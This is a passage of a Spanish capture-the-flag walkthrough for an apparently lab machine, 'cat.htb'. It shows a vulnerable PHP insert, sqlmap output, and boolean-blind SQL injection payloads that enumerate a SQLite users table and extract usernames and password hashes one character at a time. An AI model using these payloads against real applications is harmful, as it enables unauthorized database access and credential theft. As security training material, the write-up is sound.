        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'catId'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'catName'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$cat_name</span> <span class="token operator">=</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'catName'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$catId</span> <span class="token operator">=</span> <span class="token global">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'catId'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$sql_insert</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO accepted_cats (name) VALUES ('<span class="token interpolation"><span class="token variable">$cat_name</span></span>')"</span><span class="token punctuation">;</span>
            <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$sql_insert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token variable">$stmt_delete</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DELETE FROM cats WHERE cat_id = :cat_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$stmt_delete</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':cat_id'</span><span class="token punctuation">,</span> <span class="token variable">$catId</span><span class="token punctuation">,</span> <span class="token scope">PDO<span class="token punctuation">::</span></span><span class="token constant">PARAM_INT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$stmt_delete</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The cat has been accepted and added successfully."</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: Cat ID or Cat Name not provided."</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Access denied."</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Preparamos un Request POST para dumpear la base de datos:</p></div><div class="el-pre"><pre class="language-python" tabindex="0"><code data-line="0" class="language-python is-loaded">POST <span class="token operator">/</span>accept_cat<span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> cat<span class="token punctuation">.</span>htb
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Cookie<span class="token punctuation">:</span> PHPSESSID<span class="token operator">=</span>dc19d9vca314ihdq9g6h

catId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catName<span class="token operator">=</span>test
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Sqlmap nos confirma que el campo es vulnerable</p></div><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">sqlmap identified the <span class="token keyword">following</span> injection <span class="token keyword">point</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">with</span> a total <span class="token keyword">of</span> <span class="token number">126</span> HTTP<span class="token punctuation">(</span>s<span class="token punctuation">)</span> requests:
<span class="token comment">---</span>
Parameter: catName <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
    <span class="token keyword">Type</span>: <span class="token keyword">boolean</span><span class="token operator">-</span>based blind
    Title: <span class="token operator">AND</span> <span class="token keyword">boolean</span><span class="token operator">-</span>based blind <span class="token operator">-</span> <span class="token keyword">WHERE</span> <span class="token operator">or</span> <span class="token keyword">HAVING</span> clause
    Payload: catId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catName<span class="token operator">=</span>test<span class="token string">'||(SELECT 0x6b575974 WHERE 9070=9070 AND 3453=3453)||'</span>
<span class="token comment">---</span>
<span class="token punctuation">[</span><span class="token number">13</span>:<span class="token number">46</span>:<span class="token number">48</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing MySQL
<span class="token punctuation">[</span><span class="token number">13</span>:<span class="token number">46</span>:<span class="token number">48</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> the back<span class="token operator">-</span><span class="token keyword">end</span> DBMS <span class="token operator">is</span> <span class="token operator">not</span> MySQL
<span class="token punctuation">[</span><span class="token number">13</span>:<span class="token number">46</span>:<span class="token number">48</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>CRITICAL<span class="token punctuation">]</span> sqlmap was <span class="token operator">not</span> able <span class="token keyword">to</span> fingerprint the back<span class="token operator">-</span><span class="token keyword">end</span> <span class="token keyword">database</span> management system
<span class="token punctuation">[</span><span class="token number">13</span>:<span class="token number">46</span>:<span class="token number">48</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> HTTP error codes detected during run:
<span class="token number">500</span> <span class="token punctuation">(</span>Internal Server Error<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">84</span> times

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> ending @ <span class="token number">13</span>:<span class="token number">46</span>:<span class="token number">48</span> <span class="token operator">/</span><span class="token number">2025</span><span class="token operator">-</span><span class="token number">02</span><span class="token operator">-</span><span class="token number">07</span><span class="token operator">/</span>

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Con esta solicitud mandamos esta query SQL al servidor</p></div><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> accepted_cats <span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'TEST'</span> <span class="token keyword">UNION</span> <span class="token keyword">ALL</span> <span class="token keyword">SELECT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span> table_name <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">WHERE</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">AND</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">)</span>'
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Query valida:<br>
<span alt="Pasted image 20250207135540.png" src="Pasted image 20250207135540.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250207135540.png" src="machines/cat/imgs/pasted-image-20250207135540.png"></span></p></div><div class="el-p"><p dir="auto">SQLI:<br>
<span alt="Pasted image 20250207140253.png" src="Pasted image 20250207140253.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250207140253.png" src="machines/cat/imgs/pasted-image-20250207140253.png"></span></p></div><div class="el-h3 heading-wrapper"><h3 data-heading="SQL BLIND BOOLEAN BASED" dir="auto" class="heading" id="SQL_BLIND_BOOLEAN_BASED"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>SQL BLIND BOOLEAN BASED</h3><div class="heading-children"><div class="el-p"><p dir="auto">500 server INTERNAL ERROR:<br>
<span alt="Pasted image 20250207180808.png" src="Pasted image 20250207180808.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250207180808.png" src="machines/cat/imgs/pasted-image-20250207180808.png"></span></p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="EXISTE LA TABLA USERS?:" dir="auto" class="heading" id="EXISTE_LA_TABLA_USERS?:"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>EXISTE LA TABLA USERS?:</h3><div class="heading-children"><div class="el-p"><p dir="auto"><span alt="Pasted image 20250207180840.png" src="Pasted image 20250207180840.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250207180840.png" src="machines/cat/imgs/pasted-image-20250207180840.png"></span></p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="Existe la columna password?" dir="auto" class="heading" id="Existe_la_columna_password?"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Existe la columna password?</h3><div class="heading-children"><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">POST <span class="token operator">/</span>accept_cat<span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host: cat<span class="token punctuation">.</span>htb
Content<span class="token operator">-</span><span class="token keyword">Type</span>: application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Cookie: PHPSESSID<span class="token operator">=</span><span class="token number">5</span>k79n5uih9n3lf2i9n2cv21p4q
Content<span class="token operator">-</span>Length: <span class="token number">103</span>

catId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catName<span class="token operator">=</span>test<span class="token string">'||(SELECT '</span><span class="token boolean">true</span><span class="token string">' FROM pragma_table_info('</span>users<span class="token string">') WHERE name='</span>password<span class="token string">' LIMIT 1)||'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250208180856.png" src="Pasted image 20250208180856.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250208180856.png" src="machines/cat/imgs/pasted-image-20250208180856.png"></span><br>
También descubro la existencia de la columna "username"</p></div><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">POST <span class="token operator">/</span>accept_cat<span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host: cat<span class="token punctuation">.</span>htb
Content<span class="token operator">-</span><span class="token keyword">Type</span>: application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Cookie: PHPSESSID<span class="token operator">=</span><span class="token number">5</span>k79n5uih9n3lf2i9n2cv21p4q
Content<span class="token operator">-</span>Length: <span class="token number">103</span>

catId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catName<span class="token operator">=</span>test<span class="token string">'||(SELECT '</span><span class="token boolean">true</span><span class="token string">' FROM pragma_table_info('</span>users<span class="token string">') WHERE name='</span>username<span class="token string">' LIMIT 1)||'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250208181220.png" src="Pasted image 20250208181220.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250208181220.png" src="machines/cat/imgs/pasted-image-20250208181220.png"></span></p></div><div class="el-p"><p dir="auto">Pues ahora a sacar los Usernames y las passwords;</p></div></div></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="Usernames &amp; passwords Blind sqli" dir="auto" class="heading" id="Usernames_&amp;_passwords_Blind_sqli"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Usernames &amp; passwords Blind sqli</h2><div class="heading-children"><div class="el-h4 heading-wrapper"><h4 data-heading="1. Payload Base para Extraer Caracteres del nombre" dir="auto" class="heading" id="1._Payload_Base_para_Extraer_Caracteres_del_nombre"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>1. Payload Base para Extraer Caracteres del nombre</h4><div class="heading-children"><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">catId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catName<span class="token operator">=</span>test<span class="token string">'||(SELECT '</span><span class="token boolean">true</span><span class="token string">' FROM users WHERE SUBSTR(username, N, 1) = '</span>STRING<span class="token string">' LIMIT 1)||'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-ul"><ul>
<li data-line="0" dir="auto">N : es la coordenada del caracter, es decir N=1 primera string</li>
<li data-line="1" dir="auto">STRING : letra</li>
</ul></div><div class="el-p"><p dir="auto">Probamos con la a de Axel a ver si existe;<br>
<span alt="Pasted image 20250208182307.png" src="Pasted image 20250208182307.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250208182307.png" src="machines/cat/imgs/pasted-image-20250208182307.png"></span><br>
la b da un 500 Internal server erros por lo que comprobamos que el payload funciona!;<br>
<span alt="Pasted image 20250208182334.png" src="Pasted image 20250208182334.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250208182334.png" src="machines/cat/imgs/pasted-image-20250208182334.png"></span></p></div><div class="el-p"><p dir="auto">para sacar el segundo username de la base de datos basta con poner "LIMIT 1 OFFSET 1"<br>
ahora sabemos que el segundo nombre de usuario empieza por "r":<br>
<span alt="Pasted image 20250208182641.png" src="Pasted image 20250208182641.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250208182641.png" src="machines/cat/imgs/pasted-image-20250208182641.png"></span></p></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="2. Payload Base para Extraer Caracteres de la password" dir="auto" class="heading" id="2._Payload_Base_para_Extraer_Caracteres_de_la_password"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>2. Payload Base para Extraer Caracteres de la password</h4><div class="heading-children"><div class="el-p"><p dir="auto">Basicamente lo mismo que arriba pero cambiando los parametros de la columna</p></div><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">catId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catName<span class="token operator">=</span>test<span class="token string">'||(SELECT '</span><span class="token boolean">true</span><span class="token string">' FROM users WHERE SUBSTR(password, N, 1) = '</span>STRING<span class="token string">' LIMIT 1)||'</span>

</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20250208183008.png" src="Pasted image 20250208183008.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250208183008.png" src="machines/cat/imgs/pasted-image-20250208183008.png"></span></p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="3. Payload Base para saber la longitud de caracteres del Username" dir="auto" class="heading" id="3._Payload_Base_para_saber_la_longitud_de_caracteres_del_Username"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>3. Payload Base para saber la longitud de caracteres del Username</h3><div class="heading-children"><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">POST <span class="token operator">/</span>accept_cat<span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host: cat<span class="token punctuation">.</span>htb
Content<span class="token operator">-</span><span class="token keyword">Type</span>: application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Cookie: PHPSESSID<span class="token operator">=</span>b4tdio58t0hjkt9od29jkfgo8j
Content<span class="token operator">-</span>Length: <span class="token number">87</span>

catId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catName<span class="token operator">=</span>test<span class="token string">'||(SELECT '</span><span class="token boolean">true</span><span class="token string">' FROM users WHERE LENGTH(username) = 4 LIMIT 1)||'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Nos devuelve el 200 ya que sabemos que el primer username es Axel:<br>
<span alt="Pasted image 20250208185930.png" src="Pasted image 20250208185930.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250208185930.png" src="machines/cat/imgs/pasted-image-20250208185930.png"></span></p></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="4. Payload Base para saber la longitud de caracteres del password" dir="auto" class="heading" id="4._Payload_Base_para_saber_la_longitud_de_caracteres_del_password"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>4. Payload Base para saber la longitud de caracteres del password</h3><div class="heading-children"><div class="el-p"><p dir="auto">Lo mismo, diferente columna</p></div><div class="el-pre"><pre class="language-sql" tabindex="0"><code data-line="0" class="language-sql is-loaded">POST <span class="token operator">/</span>accept_cat<span class="token punctuation">.</span>php HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host: cat<span class="token punctuation">.</span>htb
Content<span class="token operator">-</span><span class="token keyword">Type</span>: application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Cookie: PHPSESSID<span class="token operator">=</span><span class="token number">421</span>ue72qb057o1qhe5rge2cb7i
Content<span class="token operator">-</span>Length: <span class="token number">97</span>

catId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>catName<span class="token operator">=</span>test<span class="token string">'||(SELECT '</span><span class="token boolean">true</span><span class="token string">' FROM users WHERE LENGTH(password) = 32 LIMIT 1 OFFSET 0)||'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Ya uso offset 0 para referirme a la password de axel ; bueno sabemos que tiene 32 caracteres ya que nos da el 200 ok </p></div><div class="el-p"><p dir="auto">Para averiguar la longitud lo pase por en intruder para que me fuese haciendo un ataque de fuerza bruta por numeros del 1 al 100 , el que me dio respuesta 200 fue "32"<br>
<span alt="Pasted image 20250208190401.png" src="Pasted image 20250208190401.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250208190401.png" src="machines/cat/imgs/pasted-image-20250208190401.png"></span><br>
<span alt="Pasted image 20250208190522.png" src="Pasted image 20250208190522.png" class="internal-embed media-embed image-embed is-loaded"><img alt="Pasted image 20250208190522.png" src="machines/cat/imgs/pasted-image-20250208190522.png"></span><br>
Tambien parece que el resto de passwords en la database tienen 32 caracteres ya que deben de estar hasheadas con el mismo algoritmo;</p></div></div></div></div></div><div class="el-h2 heading-wrapper"><h2 data-heading="Payload !" dir="auto" class="heading" id="Payload_!"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Payload !</h2><div class="heading-children"><div class="el-p"><p dir="auto">Vamos a crear un payload para sacar todos los campos de la tabla users empezando por los usernames y luego por las passwords respectivamente</p></div><div class="el-p"><p dir="auto">hasta ahora la información que tenemos es<br>
- El servidor devuelve un 500 server internal error si la query no resuelve en la base de datos<br>
- Tenemos la tabla users con las columnas username y password<br>
- la primera fila de la tabla tiene al usuario Axel<br>
-  las passwords tienen una longitud de 32 caracteres<br>
Necesitamos<br>
- Sacar el resto de usernames de la tabla users<br>
- Sacar las passwords de cada user caracter a caracter </p></div><div class="el-h3 heading-wrapper"><h3 data-heading="Tecnicismos" dir="auto" class="heading" id="Tecnicismos"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>Tecnicismos</h3><div class="heading-children"><div class="el-h4 heading-wrapper"><h4 data-heading="**1. Función `send_payload`:**" dir="auto" class="heading" id="**1._Función_`send_payload`:**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>1. Función <code>send_payload</code>:</strong></h4><div class="heading-children"><div class="el-ul"><ul>
<li data-line="0" dir="auto">Envía el payload al servidor y verifica si la respuesta tiene un código de estado <code>200 OK</code>.</li>
<li data-line="1" dir="auto">Si la consulta SQL es válida, el servidor responderá con <code>200 OK</code>. De lo contrario, devolverá <code>500 Internal Server Error</code>.</li>
</ul></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="**2. Función `dump_field`:**" dir="auto" class="heading" id="**2._Función_`dump_field`:**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>2. Función <code>dump_field</code>:</strong></h4><div class="heading-children"><div class="el-ul"><ul>
<li data-line="0" dir="auto">Dumpea un campo específico (<code>username</code> o <code>password</code>) caracter por caracter.</li>
<li data-line="1" dir="auto">Usa <code>SUBSTR()</code> para extraer cada carácter en una posición específica.</li>
<li data-line="2" dir="auto">Itera sobre todos los caracteres ASCII imprimibles (de <code>32</code> a <code>126</code>).</li>
</ul></div></div></div><div class="el-h4 heading-wrapper"><h4 data-heading="**3. Función `main`:**" dir="auto" class="heading" id="**3._Función_`main`:**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>3. Función <code>main</code>:</strong></h4><div class="heading-children"><div class="el-ul"><ul>
<li data-line="0" dir="auto">Dumpea todos los nombres de usuario hasta un offset máximo (<code>max_users</code>).</li>
<li data-line="1" dir="auto">Luego, dumpea las contraseñas correspondientes a cada nombre de usuario.</li>
<li data-line="2" dir="auto">Almacena los resultados en listas y los imprime al final.</li>
</ul></div><div class="el-hr"><hr></div></div></div></div></div><div class="el-h3 heading-wrapper"><h3 data-heading="**Cómo Funciona el Script**" dir="auto" class="heading" id="**Cómo_Funciona_el_Script**"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div><strong>Cómo Funciona el Script</strong></h3><div class="heading-children"><div class="el-ol"><ol>
<li data-line="0" dir="auto"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p><strong>Dumpear Nombres de Usuario:</strong></p>
<ul>
<li data-line="2" dir="auto">Para cada offset (<code>i</code>), intenta dumpear el nombre de usuario letra por letra.</li>
<li data-line="3" dir="auto">Si no encuentra más usuarios, detiene el proceso.</li>
</ul>
</li>
